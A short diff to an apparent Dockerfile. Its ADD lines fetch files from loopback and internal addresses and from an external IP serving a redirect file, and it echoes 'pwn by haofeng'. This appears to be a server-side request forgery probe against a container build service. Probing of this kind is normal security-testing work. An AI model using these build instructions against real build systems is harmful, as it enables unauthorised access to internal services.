@@ -19,6 +19,7 @@ run echo "pwn by haofeng"
 #ADD http://127.0.0.1:3333/1/txt /tmp/1.txt
 #ADD http://localhost:8080/1/txt /tmp/1.txt
 #ADD http://[::1]:8080/1/txt /tmp/1.txt
-ADD http://198.11.182.248:8080/302.txt /tmp/1.txt
+#ADD http://198.11.182.248:8080/302.txt /tmp/1.txt
+ADD http://0.0.0.0:8080/302.txt /tmp/1.txt
 
 run echo "end!"
